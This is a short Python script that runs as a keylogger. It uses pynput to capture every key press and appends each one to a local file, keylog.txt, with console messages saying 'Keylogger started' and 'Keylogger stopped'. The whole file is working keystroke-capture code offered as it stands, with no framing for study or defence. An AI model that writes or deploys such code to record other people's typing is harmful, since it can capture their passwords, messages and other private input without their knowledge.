from pynput.keyboard import Listener
import sys

# Function to handle key press events
def on_press(key):
    try:
        # Write the pressed key to the log file
        with open('keylog.txt', 'a') as f:
            f.write(f'{key}\n')
    except Exception as e:
        print(f'Error: {str(e)}')

# Start the listener to monitor key presses
with Listener(on_press=on_press) as listener:
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        listener.join()  # Keep the listener active
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        sys.exit(0)  # Exit the script gracefully
